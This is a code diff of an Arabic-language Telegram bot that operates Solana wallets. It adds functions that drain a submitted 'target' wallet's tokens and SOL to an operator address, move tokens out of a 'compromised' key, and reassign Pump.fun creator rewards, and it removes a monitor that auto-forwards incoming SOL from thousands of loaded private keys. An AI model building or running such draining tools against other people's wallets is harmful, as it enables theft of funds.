+// 2.5 حرق/إغلاق لمحفظة مُدخلة
+// ──────────────────────────────────────────────────────────
+
+async function analyzeSelfBurnPreview(sourceKeypair) {
+  const connection = getSendConn();
+  const [tokenAccounts, token2022Accounts] = await Promise.all([
+    getParsedTokenAccountsSafe(connection, sourceKeypair.publicKey, TOKEN_PROGRAM_ID),
+    getParsedTokenAccountsSafe(connection, sourceKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
+  ]);
+  const processable = [...tokenAccounts, ...token2022Accounts]
+    .filter(a => a.account.data.parsed?.info?.state !== "frozen");
+  const { valuable, burnable } = await classifyAccountsByValue(processable);
+  const solLamports = await connection.getBalance(sourceKeypair.publicKey, "confirmed").catch(() => 0);
+  return { valuable, burnable, solLamports };
+}
+
+async function executeSelfBurnAndDrain(sourceKeypair) {
+  const destinationKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  if (!destinationKeypair) return { success: false, msg: "مفتاح دافع الرسوم غير مُهيّأ" };
+  if (destinationKeypair.publicKey.equals(sourceKeypair.publicKey)) {
+    return { success: false, msg: "المحفظة المصدر مطابقة للوجهة!" };
+  }
+
+  const connection = getSendConn();
+  const preview = await analyzeSelfBurnPreview(sourceKeypair);
+  const { valuable, burnable } = preview;
+
+  let transferredCount = 0;
+  if (valuable.length > 0) {
+    const existingAtas = new Set();
+    for (const programId of [TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID]) {
+      const atas = await getParsedTokenAccountsSafe(connection, destinationKeypair.publicKey, programId);
+      atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
+    }
+
+    const batches = [];
+    for (let i = 0; i < valuable.length; i += BATCH_SIZE_TRANSFER) {
+      batches.push(valuable.slice(i, i + BATCH_SIZE_TRANSFER));
+    }
+
+    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
+      const tx = new Transaction();
+      tx.feePayer = sourceKeypair.publicKey;
+      const mintsInThisTx = new Set();
+
+      for (const account of batch) {
+        const info     = account.account.data.parsed?.info;
+        const mintStr  = info?.mint;
+        const mint     = new PublicKey(mintStr);
+        const decimals = info?.tokenAmount?.decimals ?? 0;
+        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
+        const progId   = account.programId;
+
+        if (rawAmt <= 0n) continue;
+
+        const destAta = getAssociatedTokenAddressSync(mint, destinationKeypair.publicKey, false, progId);
+        if (!existingAtas.has(mintStr) && !mintsInThisTx.has(mintStr)) {
+          tx.add(createAssociatedTokenAccountInstruction(
+            sourceKeypair.publicKey, destAta, destinationKeypair.publicKey, mint, progId
+          ));
+          mintsInThisTx.add(mintStr);
+        }
+        tx.add(createTransferCheckedInstruction(
+          account.pubkey, mint, destAta, sourceKeypair.publicKey, rawAmt, decimals, [], progId
+        ));
+        tx.add(createCloseAccountInstruction(
+          account.pubkey, sourceKeypair.publicKey, sourceKeypair.publicKey, [], progId
+        ));
+      }
+
+      if (tx.instructions.length === 0) return 0;
+      await sendAndConfirm(connection, tx, [sourceKeypair]);
+      mintsInThisTx.forEach(m => existingAtas.add(m));
+      return batch.length;
+    });
+
+    results.forEach(r => { if (r.status === "fulfilled") transferredCount += r.value; });
+  }
+
+  let burnedCount = 0;
+  if (burnable.length > 0) {
+    const batches = [];
+    for (let i = 0; i < burnable.length; i += BATCH_SIZE_BURN) {
+      batches.push(burnable.slice(i, i + BATCH_SIZE_BURN));
+    }
+
+    const results = await runWithConcurrency(batches, PARALLEL_LIMIT, async (batch) => {
+      const tx = new Transaction();
+      tx.feePayer = sourceKeypair.publicKey;
+
+      for (const account of batch) {
+        const info     = account.account.data.parsed?.info;
+        const mint     = new PublicKey(info?.mint);
+        const decimals = info?.tokenAmount?.decimals ?? 0;
+        const rawAmt   = BigInt(info?.tokenAmount?.amount || "0");
+        const progId   = account.programId;
+
+        if (rawAmt > 0n) {
+          tx.add(createBurnCheckedInstruction(
+            account.pubkey, mint, sourceKeypair.publicKey, rawAmt, decimals, [], progId
+          ));
+        }
+        tx.add(createCloseAccountInstruction(
+          account.pubkey, sourceKeypair.publicKey, sourceKeypair.publicKey, [], progId
+        ));
+      }
+
+      const conn = getSendConn();
+      await sendAndConfirm(conn, tx, [sourceKeypair]);
+      return batch.length;
+    });
+
+    results.forEach(r => { if (r.status === "fulfilled") burnedCount += r.value; });
+  }
+
+  let solTransferred = 0;
+  try {
+    const balance = await connection.getBalance(sourceKeypair.publicKey, "confirmed");
+    const RESERVE = 5000;
+    if (balance > RESERVE) {
+      const lamports = balance - RESERVE;
+      const tx = new Transaction();
+      tx.feePayer = sourceKeypair.publicKey;
+      tx.add(SystemProgram.transfer({
+        fromPubkey: sourceKeypair.publicKey,
+        toPubkey: destinationKeypair.publicKey,
+        lamports,
+      }));
+      await sendAndConfirm(connection, tx, [sourceKeypair]);
+      solTransferred = lamports;
+    }
+  } catch (e) {}
+
+  return {
+    success: true,
+    transferredCount,
+    burnedCount,
+    valuableCount: valuable.length,
+    solTransferredSOL: (solTransferred / 1e9).toFixed(6),
+    sourcePubkey: sourceKeypair.publicKey.toBase58(),
+    destinationPubkey: destinationKeypair.publicKey.toBase58(),
+  };
+}
+
+async function executeCustomTransfer(mintAddress, percentage) {
+  const feePayerKeypair = loadKeypair(FEE_PAYER_PRIVATE_KEY);
+  const compromisedKeypair = loadKeypair(COMPROMISED_PRIVATE_KEY);
+
+  if (!feePayerKeypair || !compromisedKeypair) {
+    return { success: false, msg: "المفاتيح غير مكتملة" };
+  }
+
+  const connection = getSendConn();
+  const mintPubkey = new PublicKey(mintAddress);
+
+  const [tokenAccounts, token2022Accounts] = await Promise.all([
+    getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
+    getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
+  ]);
+
+  const targetAccount = [...tokenAccounts, ...token2022Accounts].find(
+    a => a.account.data.parsed?.info?.mint === mintAddress
+  );
+
+  if (!targetAccount) {
+    return { success: false, msg: "التوكن غير موجود بالمحفظة!" };
+  }
+
+  const info = targetAccount.account.data.parsed?.info;
+  const decimals = info?.tokenAmount?.decimals ?? 0;
+  const rawAmt = BigInt(info?.tokenAmount?.amount || "0");
+
+  if (rawAmt <= 0n) {
+    return { success: false, msg: "رصيد التوكن 0!" };
+  }
+
+  const transferAmt = (rawAmt * BigInt(Math.floor(percentage))) / 100n;
+  const progId = targetAccount.programId;
+
+  const tx = new Transaction();
+  tx.feePayer = feePayerKeypair.publicKey;
+
+  const destAta = getAssociatedTokenAddressSync(mintPubkey, feePayerKeypair.publicKey, false, progId);
+
+  let existingAtas = new Set();
+  try {
+    const atas = await getParsedTokenAccountsSafe(connection, feePayerKeypair.publicKey, progId);
+    atas.forEach(a => existingAtas.add(a.account.data.parsed?.info?.mint));
+  } catch {}
+
+  if (!existingAtas.has(mintAddress)) {
+    tx.add(createAssociatedTokenAccountInstruction(
+      feePayerKeypair.publicKey, destAta, feePayerKeypair.publicKey, mintPubkey, progId
+    ));
+  }
+
+  tx.add(createTransferCheckedInstruction(
+    targetAccount.pubkey, mintPubkey, destAta, compromisedKeypair.publicKey, transferAmt, decimals, [], progId
+  ));
+
+  await sendAndConfirm(connection, tx, [feePayerKeypair, compromisedKeypair]);
+
+  return {
+    success: true,
+    solRecovered: "0.00000",
+    pubkey: feePayerKeypair.publicKey.toBase58()
+  };
+}
+
+// ──────────────────────────────────────────────────────────
+// 3. خادم Express والبوت
+// ──────────────────────────────────────────────────────────
+
+const userState = new Map();
+const selfBurnKeys = new Map();
+
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+let botReady = false;
+app.get("/", (_req, res) => res.status(200).send("ok"));
+app.get("/health", (_req, res) => res.status(200).json({ ok: true, botReady }));
+
+const WEBHOOK_URL = process.env.WEBHOOK_URL; // مثال: https://your-app.up.railway.app
+const WEBHOOK_PATH = "/tg-webhook";
+const WEBHOOK_SECRET = (BOT_TOKEN || "").replace(/[^A-Za-z0-9_-]/g, "").slice(-40);
+
+app.listen(PORT, "0.0.0.0", () => {
+  console.log(`Server listening on port ${PORT}`);
+  setImmediate(() => startBot().catch((e) => console.error("startBot failed:", e?.message || e)));
+  setTimeout(() => loadPump().catch(() => {}), 2000);
+});
+
+async function startBot() {
+  if (!BOT_TOKEN) { console.error("❌ TELEGRAM_BOT_TOKEN غير موجود"); return; }
+  const bot = new Bot(BOT_TOKEN);
+
+  bot.api.config.use(async (prev, method, payload, signal) => {
+    try {
+      return await prev(method, payload, signal);
+    } catch (err) {
+      const description = err?.description || err?.message || "";
+      const isParseErr =
+        (method === "sendMessage" || method === "editMessageText") &&
+        payload?.parse_mode &&
+        /can'?t parse entities/i.test(description);
+      if (isParseErr) {
+        console.warn(`⚠️ parse failed (${description}) — resending as plain text.`);
+        const { parse_mode, ...rest } = payload;
+        return await prev(method, rest, signal);
+      }
+      throw err;
+    }
+  });
+
+  bot.catch((err) => {
+    const msg = err?.error?.message || err?.message || String(err);
+    if (msg.includes("409")) {
+      console.warn("⚠️ 409 Conflict caught by bot.catch — ignored (retry handles it).");
+      return;
+    }
+    console.error("Telegram Bot Error:", msg);
+  });
+
+
+  try {
+    await bot.api.setMyCommands([
+      { command: "start",    description: "بدء البوت والقائمة الرئيسية" },
+      { command: "delegate", description: "نقل تفويض مكافآت المنشئ (Pump.fun)" },
+    ]);
+    console.log("📋 Bot commands registered.");
+  } catch (e) {
+    console.warn("⚠️ Failed to register bot commands:", e.message);
+  }
+
+  bot.use(async (ctx, next) => {
+    const fromId = ctx.from?.id;
+    if (fromId && ADMIN_IDS.includes(fromId)) {
+      return next();
+    }
+  });
+
+  const mainKeyboard = new InlineKeyboard()
+    .text("نقل التوكنات", "transfer_tokens")
+    .text("حرق 🔥", "burn_tokens")
+    .row()
+    .text("🧨 حرق محفظة خاصة", "self_burn")
+    .text("📝 تفويض", "delegate_transfer");
+
+  bot.command("start", async (ctx) => {
+    userState.delete(ctx.from.id);
+    selfBurnKeys.delete(ctx.from.id);
+    await ctx.reply(
+      "أهلاً بك! اختر إحدى العمليات التالية:\n\n" +
+      "• /delegate — نقل تفويض مكافآت المنشئ",
+      { reply_markup: mainKeyboard }
+    );
+  });
+
+  // ── أمر /delegate — نقل تفويض مكافآت المنشئ ──
+  bot.command("delegate", async (ctx) => {
+    userState.set(ctx.from.id, { awaitingDelegateMint: true });
+    const recipientAddr = getFeePayerAddress();
+    const creatorAddr   = getCreatorAddress();
+    await ctx.reply(
+      "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
+      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
+      `📥 المستلم: ${recipientAddr}\n` +
+      `👤 الموقّع كمنشئ: ${creatorAddr}`
+    );
+  });
+
+  bot.callbackQuery("transfer_tokens", async (ctx) => {
+    userState.delete(ctx.from.id);
+    await ctx.answerCallbackQuery();
+    await ctx.reply("⏳ جاري تنفيذ عملية نقل التوكنات...");
+
+    try {
+      const res = await executeTransferTokens();
+      if (res.success) {
+        await ctx.reply(`✅ تم التنفيذ بنجاح!\n\n💎 إجمالي SOL المستعاد: ${res.solRecovered} SOL\n📍 المحفظة: ${res.pubkey}`);
+      } else {
+        await ctx.reply(`❌ فشلت العملية: ${res.msg}`);
+      }
+    } catch (err) {
+      await ctx.reply("❌ حدث خطأ أثناء تنفيذ النقل.");
+    }
+  });
+
+  bot.callbackQuery("burn_tokens", async (ctx) => {
+    userState.delete(ctx.from.id);
+    await ctx.answerCallbackQuery();
+    await ctx.reply("⏳ جاري استعلام أسعار التوكنات من Jupiter و DexScreener و Raydium...");
+
+    try {
+      const preview = await analyzeBurnPreview();
+      if (!preview.success) { await ctx.reply(`❌ ${preview.msg}`); return; }
+
+      userState.set(ctx.from.id, { burnPreview: { stage: 1, valuableCount: preview.valuable.length, burnableCount: preview.burnable.length } });
+
+      let msg = `📊 تحليل المحفظة:\n\n`;
+      msg += `🔥 قابلة للحرق (< $${VALUE_THRESHOLD_USD}): ${preview.burnable.length} حساب\n`;
+      msg += `💰 قيّمة (لن تُحرق): ${preview.valuable.length} حساب\n`;
+      if (preview.valuable.length > 0) {
+        msg += `\n⚠️ توكنات كبيرة لن يتم حرقها:\n${formatValuableList(preview.valuable)}\n`;
+      }
+      msg += `\n⚠️ هل تريد المتابعة؟ (تأكيد أول)`;
+
+      const kb = new InlineKeyboard()
+        .text("✅ تأكيد أول", "burn_confirm1")
+        .text("إلغاء", "cancel_burn");
+      await ctx.reply(msg, { reply_markup: kb });
+    } catch (err) {
+      console.error(err);
+      await ctx.reply("❌ حدث خطأ أثناء التحليل.");
+    }
+  });
+
+  bot.callbackQuery("burn_confirm1", async (ctx) => {
+    await ctx.answerCallbackQuery();
+    const st = userState.get(ctx.from.id);
+    if (!st?.burnPreview) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }
+    st.burnPreview.stage = 2;
+    userState.set(ctx.from.id, st);
+
+    const kb = new InlineKeyboard()
+      .text("🔥 تأكيد نهائي", "burn_confirm2")
+      .text("إلغاء", "cancel_burn");
+    await ctx.reply(
+      `⚠️ تأكيد ثانٍ ونهائي\n\nسيتم حرق ${st.burnPreview.burnableCount} حساب فقط.\nالتوكنات القيّمة (${st.burnPreview.valuableCount}) لن تُحرق.`,
+      { reply_markup: kb }
+    );
+  });
+
+  bot.callbackQuery("burn_confirm2", async (ctx) => {
+    await ctx.answerCallbackQuery();
+    userState.delete(ctx.from.id);
+    await ctx.reply("⏳ جاري تنفيذ الحرق والإغلاق...");
+    try {
+      const res = await executeBurnAndClose();
+      if (res.success) {
+        await ctx.reply(
+          `✅ تم الحرق بنجاح!\n\n💎 SOL المستعاد: ${res.solRecovered} SOL\n💰 تم تخطي ${res.skipped || 0} توكن قيّم\n📍 ${res.pubkey}`
+        );
+      } else {
+        await ctx.reply(`❌ فشل: ${res.msg}`);
+      }
+    } catch (err) {
+      console.error(err);
+      await ctx.reply("❌ حدث خطأ أثناء الحرق.");
+    }
+  });
+
+  bot.callbackQuery("cancel_burn", async (ctx) => {
+    userState.delete(ctx.from.id);
+    selfBurnKeys.delete(ctx.from.id);
+    await ctx.answerCallbackQuery();
+    await ctx.reply("❌ تم الإلغاء.", { reply_markup: mainKeyboard });
+  });
+
+  bot.callbackQuery("self_burn", async (ctx) => {
+    userState.set(ctx.from.id, { awaitingKey: true });
+    await ctx.answerCallbackQuery();
+    const destAddr = getFeePayerAddress();
+    await ctx.reply(
+      "🔑 أرسل المفتاح الخاص للمحفظة المستهدفة (Base58 أو JSON array بطول 64 بايت).\n\n" +
+      "سيتم:\n" +
+      `• تحويل التوكنات التي قيمتها > $${VALUE_THRESHOLD_USD} إلى المحفظة: ${destAddr}\n` +
+      "• حرق وإغلاق باقي التوكنات\n" +
+      `• تحويل كامل رصيد SOL إلى: ${destAddr}\n` +
+      "• الرسوم كلها من المحفظة نفسها"
+    );
+  });
+
+  bot.callbackQuery("delegate_transfer", async (ctx) => {
+    userState.set(ctx.from.id, { awaitingDelegateMint: true });
+    await ctx.answerCallbackQuery();
+    const recipientAddr = getFeePayerAddress();
+    const creatorAddr   = getCreatorAddress();
+    await ctx.reply(
+      "📝 أرسل عنوان عقد التوكن (Mint) الخاص بعملة Pump.fun.\n\n" +
+      "سيتم نقل تفويض استلام 100% من مكافآت المنشئ إلى المحفظة التالية:\n" +
+      `📥 المستلم: ${recipientAddr}\n` +
+      `👤 الموقّع كمنشئ: ${creatorAddr}`
+    );
+  });
+
+  bot.callbackQuery("self_burn_confirm1", async (ctx) => {
+    await ctx.answerCallbackQuery();
+    const st = userState.get(ctx.from.id);
+    if (!st?.selfBurn) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }
+    st.selfBurn.stage = 2;
+    userState.set(ctx.from.id, st);
+    const destAddr = getFeePayerAddress();
+    const kb = new InlineKeyboard()
+      .text("🧨 تأكيد نهائي", "self_burn_confirm2")
+      .text("إلغاء", "cancel_burn");
+    await ctx.reply(
+      `⚠️ تأكيد ثانٍ ونهائي\n\n` +
+      `• سيُحوَّل ${st.selfBurn.valuableCount} توكن قيّم إلى ${destAddr} (لن يُحرق).\n` +
+      `• سيُحرق ${st.selfBurn.burnableCount} توكن.\n` +
+      `• سيُحوَّل كامل SOL إلى ${destAddr}.\n\nهل تريد المتابعة؟`,
+      { reply_markup: kb }
+    );
+  });
+
+  bot.callbackQuery("self_burn_confirm2", async (ctx) => {
+    await ctx.answerCallbackQuery();
+    const st = userState.get(ctx.from.id);
+    const kp = selfBurnKeys.get(ctx.from.id);
+    userState.delete(ctx.from.id);
+    selfBurnKeys.delete(ctx.from.id);
+    if (!st?.selfBurn || !kp) { await ctx.reply("انتهت الجلسة. ابدأ من جديد."); return; }
+
+    await ctx.reply("⏳ جاري التنفيذ...");
+    try {
+      const res = await executeSelfBurnAndDrain(kp);
+      if (res.success) {
+        await ctx.reply(
+          `✅ تم بنجاح!\n\n` +
+          `💸 توكنات محوّلة: ${res.transferredCount}\n` +
+          `🔥 توكنات محروقة: ${res.burnedCount}\n` +
+          `💎 SOL محوّل: ${res.solTransferredSOL} SOL\n` +
+          `📤 من: ${res.sourcePubkey}\n` +
+          `📥 إلى: ${res.destinationPubkey}`
+        );
+      } else {
+        await ctx.reply(`❌ فشل: ${res.msg}`);
+      }
+    } catch (err) {
+      console.error(err);
+      await ctx.reply("❌ حدث خطأ أثناء التنفيذ.");
+    }
+  });
+
+  bot.on("message:text", async (ctx) => {
+    const text = ctx.message.text.trim();
+    const userId = ctx.from.id;
+    const state = userState.get(userId);
+
+    if (state?.awaitingDelegateMint) {
+      if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
+        await ctx.reply("❌ عنوان توكن غير صالح. أعد الإرسال أو اضغط /start للإلغاء.");
+        return;
+      }
+      userState.delete(userId);
+      await ctx.reply(`⏳ جاري نقل التفويض للتوكن:\n${text}`);
+      try {
+        const res = await executeDelegateTransfer(text);
+        if (res.success) {
+          await ctx.reply(
+            `✅ تم نقل التفويض بنجاح!\n\n` +
+            `🪙 العملة: ${res.mint}\n` +
+            `👤 المنشئ (الموقّع): ${res.creator}\n` +
+            `📥 المستلم الجديد للمكافآت: ${res.recipient}\n` +
+            `🔗 https://solscan.io/tx/${res.sig}`
+          );
+        } else {
+          await ctx.reply(`❌ فشل نقل التفويض:\n${res.msg}`);
+        }
+      } catch (err) {
+        console.error(err);
+        await ctx.reply(`❌ حدث خطأ أثناء نقل التفويض:\n${String(err?.message || err).slice(0, 300)}`);
+      }
+      return;
+    }
+
+    if (state?.awaitingKey) {
+      const kps = extractValidKeypairs(text);
+      if (kps.length === 0) {
+        await ctx.reply("❌ مفتاح غير صالح. أرسل مفتاح Base58 أو JSON array صحيح.");
+        return;
+      }
+      const kp = kps[0];
+      try { await ctx.deleteMessage(); } catch {}
+
+      await ctx.reply(`🔍 تم تحميل المحفظة: ${kp.publicKey.toBase58()}\n\n⏳ جاري استعلام الأسعار وتحليل الحسابات...`);
+
+      try {
+        const preview = await analyzeSelfBurnPreview(kp);
+        selfBurnKeys.set(userId, kp);
+        userState.set(userId, {
+          selfBurn: {
+            stage: 1,
+            valuableCount: preview.valuable.length,
+            burnableCount: preview.burnable.length,
+          },
         });
-        this.snapshotRpcUrls = monitorUrls;
-        this._snapRpcIdx     = 0;
-        console.log(`[POOL] SOL pool: ${poolSize} اتصال عبر ${monitorUrls.length} رابط (${monitorUrls.length < poolSize ? 'تدوير' : '1:1'})`);
 
-        for (let i = 0; i < walletSlice.length; i++) {
-            try {
-                const rawKey = walletSlice[i].trim();
-                // دعم صيغتين: مصفوفة JSON [1,2,3,...] أو نص Base58
-                let secretKey;
-                if (rawKey.startsWith('[')) {
-                    secretKey = Uint8Array.from(JSON.parse(rawKey));
-                } else {
-                    secretKey = bs58.decode(rawKey);
-                }
-                const wallet = Keypair.fromSecretKey(secretKey);
-                this.wallets.push(wallet);
-                this.privateKeyStrings.push(rawKey); // حفظ للتلجرام
-                // ── كل 1000 محفظة تنتمي لاتصال واحد (pool slot) ─────────────
-                const poolIdx = Math.min(Math.floor(i / MAX_SUBS_PER_CONN), this.solPool.length - 1);
-                this.connections.push(this.solPool[poolIdx]);
-
-                // استعادة الـ cache من localStorage (إذا أُرسل)
-            } catch (e) {
-                this.notify(`❌ خطأ في تحميل المحفظة: ${e.message}`, 'error');
-                this.privateKeyStrings.push('');
-            }
+        const destAddr = getFeePayerAddress();
+        let msg = `📊 تحليل المحفظة المستهدفة:\n\n`;
+        msg += `📍 ${kp.publicKey.toBase58()}\n`;
+        msg += `💰 SOL: ${(preview.solLamports / 1e9).toFixed(6)}\n`;
+        msg += `🔥 قابلة للحرق (< $${VALUE_THRESHOLD_USD}): ${preview.burnable.length}\n`;
+        msg += `💎 قيّمة (ستُحوَّل إلى ${destAddr}): ${preview.valuable.length}\n`;
+        if (preview.valuable.length > 0) {
+          msg += `\n⚠️ توكنات كبيرة لن يتم حرقها (سيتم تحويلها):\n${formatValuableList(preview.valuable)}\n`;
         }
+        msg += `\n⚠️ هل تريد المتابعة؟ (تأكيد أول)`;
 
-        if (this.wallets.length > 0) {
-            this.isMonitoring = true;
-            await this.startMonitoring();
-        }
-        return this.wallets.length;
+        const kb = new InlineKeyboard()
+          .text("✅ تأكيد أول", "self_burn_confirm1")
+          .text("إلغاء", "cancel_burn");
+        await ctx.reply(msg, { reply_markup: kb });
+      } catch (err) {
+        console.error(err);
+        selfBurnKeys.delete(userId);
+        userState.delete(userId);
+        await ctx.reply("❌ فشل التحليل: " + String(err?.message || "خطأ غير معروف").slice(0, 200));
+      }
+      return;
     }
 
-    async startMonitoring() {
-        const total  = this.wallets.length;
+    if (state?.mintAddress) {
+      const { mintAddress } = state;
+      const percentage = parseFloat(text);
 
-        // تهيئة المصفوفات مسبقاً (lastBalances = 0 كقيمة افتراضية آمنة)
-        this.subscriptionIds = new Array(total).fill(null);
-        this.lastBalances    = new Array(total).fill(0);
+      if (isNaN(percentage) || percentage <= 0 || percentage > 100) {
+        await ctx.reply("❌ يرجى إدخال نسبة مئوية صالحة بين 1 و 100.");
+        return;
+      }
 
-        // ── الاشتراكات والـ Snapshot يعملان بالتوازي ─────────────────────────
-        // • lastBalances[i] يُقرأ فقط داخل callback الحدث وليس عند التسجيل
-        // • الـ snapshot يملأ lastBalances تدريجياً — الاشتراكات لا تنتظره
+      userState.delete(userId);
+      await ctx.reply(`⏳ جاري نقل ${percentage}% من التوكن...`);
 
-        const subscribeAll = async () => {
-            const BURST = 50;
-            for (let b = 0; b < total; b += BURST) {
-                const end = Math.min(b + BURST, total);
-                for (let i = b; i < end; i++) this._subscribeSOL(i);
-                if (end < total) await new Promise(r => setTimeout(r, SUB_BURST_DELAY));
-            }
-            console.log(`[POOL] SOL subscriptions queued: ${total}`);
-        };
+      try {
+        const res = await executeCustomTransfer(mintAddress, percentage);
+        if (res.success) {
+          await ctx.reply(`✅ تم نقل النسبة بنجاح!\n\n💎 إجمالي SOL المستعاد: ${res.solRecovered} SOL\n📍 المحفظة: ${res.pubkey}`);
+        } else {
+          await ctx.reply(`❌ فشل: ${res.msg}`);
+        }
+      } catch (e) {
+        await ctx.reply("❌ حدث خطأ أثناء تنفيذ النقل المخصص.");
+      }
+      return;
+    }
 
-        await Promise.all([
-            this._batchSnapshotSOL(total),
-            subscribeAll(),
+    if (/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(text)) {
+      try {
+        const compromisedKeypair = loadKeypair(COMPROMISED_PRIVATE_KEY);
+        if (!compromisedKeypair) {
+          await ctx.reply("❌ المفتاح غير متوفر.");
+          return;
+        }
+
+        const connection = getSendConn();
+        const [tokenAccounts, token2022Accounts] = await Promise.all([
+          getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_PROGRAM_ID),
+          getParsedTokenAccountsSafe(connection, compromisedKeypair.publicKey, TOKEN_2022_PROGRAM_ID),
         ]);
 
-        // ── مراقبة Pool — إعادة اشتراك تلقائي عند انقطاع WebSocket ──────────
-        this._setupPoolWatcher(this.solPool);
-
-        // بدء تحديث الـ blockhash عبر HTTP (RPCs المستخدم، دوران)
-        this._startBlockhashRefresh();
-
-        const poolCount = this.solPool.length;
-        this.notify(`✅ يراقب هذا العامل ${total} محفظة عبر ${poolCount} اتصال (${Math.ceil(total / poolCount)}/اتصال)`, 'success');
-    }
-
-    // مراقبة pool connections — إعادة اشتراك جماعي عند انقطاع أي WebSocket
-    _setupPoolWatcher(pool) {
-        pool.forEach((_, poolIdx) => {
-            this._watchPoolSlot(pool, poolIdx);
-        });
-    }
-
-    // ينظر على slot واحد في الـ pool ويُعيد الاتصال إذا انقطع
-    _watchPoolSlot(pool, poolIdx) {
-        const conn = pool[poolIdx];
-        const attach = () => {
-            if (!this.isMonitoring) return;
-            try {
-                const ws = conn._rpcWebSocket;
-                if (!ws) { setTimeout(attach, 1000); return; }
-                const onFail = () => {
-                    if (!this.isMonitoring) return;
-                    this.notify(`⚠️ انقطع pool[SOL#${poolIdx}] — إعادة الاتصال…`, 'warning');
-                    // إعادة استخدام نفس الرابط الأصلي لهذا الـ slot (HTTP + WSS)
-                    const httpEp = this.network === 'devnet'
-                        ? DEVNET_HTTP
-                        : (this.poolUrls?.[poolIdx] || this.snapshotRpcUrls?.[poolIdx] || this.snapshotRpcUrls?.[0]);
-                    const wssEp  = this.network === 'devnet'
-                        ? DEVNET_WSS
-                        : httpEp.replace(/^https?:\/\//i, 'wss://');
-                    const newConn = new Connection(httpEp, { commitment: 'confirmed', wsEndpoint: wssEp });
-                    pool[poolIdx] = newConn;
-                    setTimeout(() => {
-                        if (!this.isMonitoring) return;
-                        for (let i = 0; i < this.wallets.length; i++) {
-                            if (this.connections[i] === conn) {
-                                this.connections[i] = newConn;
-                                this.subscriptionIds[i] = null;
-                                this._subscribeSOL(i);
-                            }
-                        }
-                        this._watchPoolSlot(pool, poolIdx);
-                    }, 2000);
-                };
-                ws.once('error', onFail);
-                ws.once('close', onFail);
-            } catch (_) {}
-        };
-        setTimeout(attach, 1500 + poolIdx * 200);
-    }
-
-    // Snapshot SOL بدفعات 100 عبر getMultipleAccounts — RPC_URLS فقط
-    async _batchSnapshotSOL(total) {
-        const BATCH       = 100;
-        const CONCURRENCY = 15; // دفعات متوازية — خُفِّض التسلسل (رُفع من 6→15)
-        const urls        = this.snapshotRpcUrls.length ? this.snapshotRpcUrls : [];
-        if (!urls.length) { console.error('[SNAP] لا توجد روابط RPC للـ snapshot'); return; }
-
-        // بناء قائمة الدفعات مرة واحدة
-        const batches = [];
-        for (let b = 0; b < total; b += BATCH) batches.push(b);
-
-        let completed = 0;
-        let urlIdx    = 0;
-
-        const fetchBatch = async (b) => {
-            const end   = Math.min(b + BATCH, total);
-            const slice = this.wallets.slice(b, end);
-            const addrs = slice.map(w => w.publicKey.toBase58());
-            for (let attempt = 0; attempt < 4; attempt++) {
-                const url = urls[(urlIdx++) % urls.length];
-                try {
-                    const res = await fetch(url, {
-                        method : 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body   : JSON.stringify({
-                            jsonrpc: '2.0', id: 1,
-                            method : 'getMultipleAccounts',
-                            params : [addrs, { encoding: 'base64' }]
-                        }),
-                        signal: AbortSignal.timeout(12_000)
-                    });
-                    const json = await res.json();
-                    if (json.error) throw new Error(json.error.message);
-                    (json.result?.value || []).forEach((info, idx) => {
-                        this.lastBalances[b + idx] = info ? info.lamports : 0;
-                    });
-                    completed += (end - b);
-                    this.notify(`__PROGRESS__:${completed}:${total}`, 'info');
-                    return;
-                } catch (e) {
-                    console.error(`[SNAP] batch${Math.floor(b/BATCH)+1} attempt${attempt+1}: ${e.message}`);
-                    if (attempt < 3) await new Promise(r => setTimeout(r, 400 * (attempt + 1)));
-                }
-            }
-            console.error(`[SNAP] فشل جلب الدفعة ${Math.floor(b/BATCH)+1} — رصيد SOL = 0`);
-        };
-
-        // نافذة منزلقة: كل الدفعات تنطلق فوراً، أي دفعة تنتهي تُفسح مكانها للتالية
-        const sem = new Semaphore(CONCURRENCY);
-        await Promise.all(batches.map(async (b) => {
-            await sem.acquire();
-            try { await fetchBatch(b); } finally { sem.release(); }
-        }));
-    }
-
-    _subscribeSOL(i) {
-        const wallet    = this.wallets[i];
-        const connection = this.connections[i];
-        const label     = wallet.publicKey.toString().slice(0, 8) + '…';
-        // حفظ publicKey كمرجع ثابت — الفهرس يتغير عند الحذف لذا نبحث عنه ديناميكياً
-        const pubkeyStr = wallet.publicKey.toString();
-        try {
-            const subId = connection.onAccountChange(
-                wallet.publicKey,
-                async (info) => {
-                    if (!this.isMonitoring) return;
-                    // البحث الديناميكي عن الفهرس الحالي بعد أي حذف
-                    const idx = this.wallets.findIndex(w => w.publicKey.toString() === pubkeyStr);
-                    if (idx === -1) return; // المحفظة حُذفت — تجاهل الحدث
-                    try {
-                        const newBal = info.lamports;
-                        const oldBal = this.lastBalances[idx] || 0;
-                        if (newBal > oldBal && newBal > 0) {
-                            const received = newBal - oldBal;
-                            // ✅ تحديث الرصيد فوراً قبل الإرسال — يمنع race condition
-                            // إذا أطلق WebSocket نفس الـ callback مرتين (processed+confirmed)
-                            // سيرى الثاني oldBal = newBal فلن يُرسل مجدداً
-                            this.lastBalances[idx] = newBal;
-                            this.notify(`💰 وصل ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL إلى ${label}`, 'success');
-                            // نمرّر received مباشرةً — lastBalances[idx] أصبح newBal بالفعل
-                            await this.forwardFunds(this.connections[idx], wallet, newBal, received, label, idx);
-                        } else {
-                            this.lastBalances[idx] = newBal;
-                        }
-                    } catch (e) { this.handleError(e, idx, label); }
-                },
